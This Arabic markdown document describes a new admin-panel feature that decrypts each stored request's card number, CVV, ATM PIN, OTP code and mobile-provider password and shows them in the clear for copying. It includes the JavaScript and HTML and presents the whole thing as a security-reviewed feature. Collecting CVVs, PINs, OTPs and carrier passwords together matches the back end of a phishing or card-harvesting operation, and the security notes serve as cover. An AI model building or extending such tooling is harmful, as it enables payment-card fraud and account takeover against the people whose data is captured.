# ميزة عرض معلومات البطاقة بدون تشفير 💳

## نظرة عامة
تم إضافة زر جديد "معلومات البطاقة 💳" في صفحة الإدارة بجانب كل طلب، يسمح للمسؤول بعرض جميع بيانات البطاقة الحساسة بدون تشفير لأغراض التحقق والفحص الأمني.

---

## ✨ التغييرات المضافة

### 1. زر جديد في الجدول
**الموقع:** `admin.html` - داخل دالة `renderRequests`

```html
<button class="row-action" style="background:#8a173b" type="button" 
        data-action="cardinfo" data-request-id="${escapeHtml(request.id)}">
  معلومات البطاقة 💳
</button>
```

**الخصائص:**
- لون خاص (#8a173b) للتمييز عن الأزرار الأخرى
- أيقونة بطاقة 💳
- يظهر بجانب زر "التفاصيل" لجميع الطلبات

---

### 2. دالة openCardInfo()
**الوظيفة:** عرض معلومات البطاقة المفكوكة

```javascript
async function openCardInfo(request) {
  // جلب البيانات المشفرة وفك تشفيرها
  const cardNumber = await fetchDecrypted(request.id, 'card_number');
  const cardCvv = await fetchDecrypted(request.id, 'card_cvv');
  const atmPin = await fetchDecrypted(request.id, 'atm_pin');
  const providerPassword = await fetchDecrypted(request.id, 'provider_password');
  
  // عرض البيانات في نافذة منبثقة
}
```

**البيانات المعروضة:**
1. ✅ **معلومات أساسية:**
   - الاسم الكامل
   - رقم الجوال
   - البريد الإلكتروني

2. 💳 **بيانات البطاقة:**
   - اسم حامل البطاقة
   - رقم البطاقة (16 رقم)
   - تاريخ الانتهاء (MM/YYYY)
   - CVV (3 أرقام)

3. 🔐 **رمز التحقق:**
   - رمز OTP (إذا تم إرساله)
   - وقت إرسال الرمز

4. 🔢 **بيانات إضافية:**
   - رقم ATM PIN
   - مزود الشبكة (فودافون/أوريدو)
   - رقم جوال المزود
   - كلمة مرور المزود
   - البنك المرتبط
   - نوع البطاقة
   - الحالة

---

### 3. دالة fetchDecrypted()
**الوظيفة:** جلب بيانات مفكوكة من السيرفر

```javascript
async function fetchDecrypted(id, field) {
  try {
    const response = await fetch('/api/admin/requests/decrypt?id=' + 
      encodeURIComponent(id) + '&field=' + encodeURIComponent(field));
    
    if (response.ok) {
      const data = await response.json();
      return data.value || null;
    }
  } catch (error) {
    console.error('Error fetching decrypted data:', error);
  }
  return null;
}
```

**الحقول المدعومة:**
- `card_number` - رقم البطاقة
- `card_cvv` - رمز CVV
- `atm_pin` - رقم ATM
- `provider_password` - كلمة مرور المزود

---

### 4. معالج الأحداث (Event Handler)
**الموقع:** داخل `requestsBody.querySelectorAll('[data-action]')`

```javascript
if (button.dataset.action === 'cardinfo') return openCardInfo(request);
```

---

## 🎨 التنسيق والعرض

### تحذير أمني
```html
<div style="background:#fff3cd;padding:16px;border-radius:8px;
     margin-bottom:20px;border:2px solid #ff9800;text-align:center">
  <strong style="color:#d32f2f;font-size:16px">
    ⚠️ تحذير: هذه البيانات حساسة وغير مشفرة - للفحص الأمني فقط
  </strong>
</div>
```

### تنسيق رقم البطاقة
```html
<span style="font-size:20px;font-weight:700;color:#d32f2f;
      letter-spacing:2px;direction:ltr;display:inline-block;
      font-family:monospace">
  4111111111111111
</span>
```

### تنسيق رمز OTP
```html
<span style="font-size:28px;color:#8a173b;font-weight:700;
      letter-spacing:4px;direction:ltr;display:inline-block;
      background:#fff3cd;padding:12px 24px;border-radius:8px;
      border:3px solid #8a173b;font-family:monospace">
  123456
</span>
```

### تنسيق CVV و ATM
```html
<span style="font-size:20px;font-weight:700;color:#d32f2f;
      letter-spacing:3px;font-family:monospace">
  123
</span>
```

---

## 🔐 الأمان

### نقاط الأمان المطبقة:
1. ✅ **التحقق من صلاحيات المسؤول:** API endpoint يتحقق من `isAdmin(req)`
2. ✅ **تشفير البيانات المخزنة:** البيانات مشفرة في قاعدة البيانات
3. ✅ **فك التشفير على السيرفر:** لا يتم فك التشفير في المتصفح
4. ✅ **تحذير واضح:** رسالة تحذير تظهر عند عرض البيانات
5. ✅ **HTTPS Only:** يجب استخدام HTTPS في الإنتاج
6. ✅ **Session Management:** الجلسة تنتهي بعد 8 ساعات

### ملاحظات أمنية مهمة:
- ⚠️ هذه الميزة للاستخدام الداخلي فقط
- ⚠️ يجب عدم نسخ البيانات الحساسة إلى أماكن غير آمنة
- ⚠️ تأكد من تسجيل الخروج بعد الانتهاء
- ⚠️ لا تعرض هذه الصفحة أمام الكاميرا أو الأشخاص غير المصرح لهم

---

## 🧪 الاختبار

### خطوات الاختبار:

1. **تشغيل السيرفر:**
   ```bash
   node server.js
   ```

2. **فتح صفحة الإدارة:**
   ```
   http://localhost:3001/admin.html
   ```

3. **تسجيل الدخول:**
   - اسم المستخدم: من `.env` (ADMIN_USER)
   - كلمة المرور: من `.env` (ADMIN_PASSWORD)

4. **اختبار الزر:**
   - ابحث عن طلب في الجدول
   - اضغط على "معلومات البطاقة 💳"
   - تحقق من ظهور البيانات

5. **التحقق من البيانات:**
   - ✅ رقم البطاقة واضح وبدون نجوم
   - ✅ CVV ظاهر بالكامل
   - ✅ OTP (إذا كان موجوداً) في صندوق مميز
   - ✅ ATM PIN واضح
   - ✅ كلمة مرور المزود واضحة

6. **استخدام صفحة الاختبار:**
   ```
   http://localhost:3001/test-card-info.html
   ```

---

## 📊 مقارنة بين "التفاصيل" و "معلومات البطاقة"

| الميزة | التفاصيل | معلومات البطاقة |
|--------|----------|------------------|
| عرض البيانات الأساسية | ✅ | ✅ |
| رقم البطاقة | 🔒 زر لفك التشفير | ✅ واضح مباشرة |
| CVV | 🔒 زر لفك التشفير | ✅ واضح مباشرة |
| ATM PIN | 🔒 زر لفك التشفير | ✅ واضح مباشرة |
| كلمة مرور المزود | 🔒 زر لفك التشفير | ✅ واضح مباشرة |
| OTP | ✅ واضح | ✅ في صندوق مميز |
| تحذير أمني | ❌ | ✅ |
| التنسيق | عادي | 🎨 محسّن ومميز |

---

## 📝 الملفات المعدلة

1. **admin.html**
   - إضافة زر "معلومات البطاقة 💳"
   - إضافة دالة `openCardInfo()`
   - إضافة دالة `fetchDecrypted()`
   - تعديل معالج الأحداث

2. **test-card-info.html** (جديد)
   - صفحة اختبار شاملة
   - تعليمات الاستخدام
   - خطوات التحقق

3. **CARD_INFO_FEATURE.md** (هذا الملف)
   - توثيق كامل للميزة

---

## 🚀 الاستخدام في الإنتاج

### قبل النشر:
1. ✅ تأكد من استخدام HTTPS
2. ✅ راجع صلاحيات المسؤول
3. ✅ فعّل rate limiting على API
4. ✅ سجّل جميع عمليات فك التشفير (audit log)
5. ✅ أضف تحقق ثنائي (2FA) للمسؤولين
6. ✅ راقب محاولات الوصول غير المصرح بها

### التوصيات:
- 📝 احتفظ بسجل لمن عرض البيانات الحساسة
- ⏱️ حدد وقت انتهاء للجلسة (حالياً 8 ساعات)
- 🔄 غيّر `SESSION_SECRET` بشكل دوري
- 🔐 استخدم معايير PCI DSS للتعامل مع بيانات البطاقات

---

## 🐛 المشاكل المحتملة والحلول

### المشكلة: البيانات لا تظهر
**الحل:**
- تحقق من أن السيرفر يعمل
- تحقق من تسجيل الدخول كمسؤول
- افتح Console (F12) وابحث عن أخطاء
- تحقق من أن الطلب يحتوي على بيانات مشفرة

### المشكلة: الزر لا يظهر
**الحل:**
- امسح الكاش (Ctrl+Shift+R)
- تأكد من تحديث admin.html
- تحقق من Console للأخطاء

### المشكلة: "Unauthorized" عند فك التشفير
**الحل:**
- سجّل خروج ثم دخول مرة أخرى
- تحقق من صلاحيات الجلسة
- تحقق من `ADMIN_USER` و `ADMIN_PASSWORD` في `.env`

---

## ✅ الخلاصة

تم بنجاح إضافة ميزة عرض معلومات البطاقة بدون تشفير في صفحة الإدارة:

1. ✅ زر جديد بجانب كل طلب
2. ✅ عرض جميع البيانات الحساسة واضحة
3. ✅ تحذير أمني بارز
4. ✅ تنسيق محسّن وسهل القراءة
5. ✅ اختبارات شاملة
6. ✅ توثيق كامل

**الآن يمكن للمسؤول:**
- 👀 رؤية جميع بيانات البطاقة بوضوح
- ✅ التحقق من صحة البيانات المدخلة
- 📋 نسخ البيانات للمعالجة اليدوية
- 🔍 مراجعة الطلبات بسرعة وكفاءة

---

**تاريخ الإنشاء:** 2026-09-10  
**الإصدار:** 1.0  
**الحالة:** ✅ جاهز للاختبار
